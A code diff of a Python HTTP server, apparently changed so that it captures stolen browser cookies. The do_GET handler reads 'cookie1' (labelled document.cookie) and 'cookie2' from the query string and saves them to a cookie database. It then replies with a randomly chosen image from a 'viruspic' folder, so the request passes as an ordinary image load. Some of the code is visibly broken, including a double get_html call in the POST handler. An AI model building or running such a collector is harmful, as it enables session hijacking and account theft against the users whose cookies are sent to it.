@@ -12,24 +12,46 @@ import logging
 # my server
 import time, socket, threading
 from http.server import test as _test
+import os
+import random
+from mypic import Pic
 from socketserver     import ThreadingMixIn
-from pic import Pic
 from http.cookies import SimpleCookie
+from usercookie import Usercookie
+from urllib.parse import urlparse,parse_qs
+
+viruspic=os.listdir("./my_pic")
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
                 pass
 
 
 class S(BaseHTTPRequestHandler):
-    def _set_response(self):
+    def _set_response(self,pic=False):
         self.send_response(200)
-        self.send_header('Content-type', 'image/*')
+        if pic:
+          self.send_header('Content-type', 'image/'+pic)
+        else:
+          self.send_header('Content-type', 'image/*')
         self.end_headers()
 
     def do_GET(self):
         logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
+        virus=random.choice(viruspic)
 
-        mypic=Pic("virus").get_html()
-        self._set_response()
+        mypic=Pic("/my_pic/"+virus)
+        params=parse_qs(urlparse(self.path).query)
+        print(params,"HEY")
+
+        dbCookies=Usercookie()
+        try:
+          text=dbCookies.create({"text": params["cookie1"][0]})
+        except:
+          print("document.cookie vide")
+        try:
+          text=dbCookies.create({"text": params["cookie2"][0]})
+        except:
+          print("python cookie vide")
+        self._set_response(mypic.get_pic())
         self.wfile.write(mypic.get_html())
 
     def do_POST(self):
@@ -38,7 +60,9 @@ class S(BaseHTTPRequestHandler):
         logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                 str(self.path), str(self.headers), post_data.decode('utf-8'))
 
-        mypic=Pic("virus").get_html()
+        virus=random.choice(viruspic)
+        mypic=Pic(virus).get_html()
+
         self._set_response()
         self.wfile.write(mypic.get_html())
 
